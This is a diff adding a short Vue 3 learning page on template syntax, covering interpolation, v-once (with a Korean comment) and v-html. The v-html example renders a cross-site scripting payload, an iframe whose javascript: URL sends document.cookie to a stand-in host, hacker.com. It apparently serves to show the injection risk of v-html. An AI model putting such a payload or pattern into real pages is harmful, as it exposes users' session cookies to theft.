@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>템플릿 문법</title>
+  <script src="https://unpkg.com/vue@3/dist/vue.global.js"></script>
+</head>
+
+<body>
+  <div id="app">
+    <h1>{{ msg }}</h1>
+    <h2 v-once>{{ msg }}</h2> <!-- 한번만 출력하고 다음에는 반응성을 가지지 않게 한다.  -->
+    <div v-html=rawHTML></div>
+  </div>
+
+  <script>
+    const App = {
+      data() {
+        return {
+          msg: 'Hello Vue!',
+          rawHTML: `<iframe src="javascript: window.open('http://hacker.com?hack=' + document.cookie)"></iframe>`
+        }
+      }
+    }
+    const vm = Vue.createApp(App).mount('#app');
+  </script>
+</body>
+
+</html>
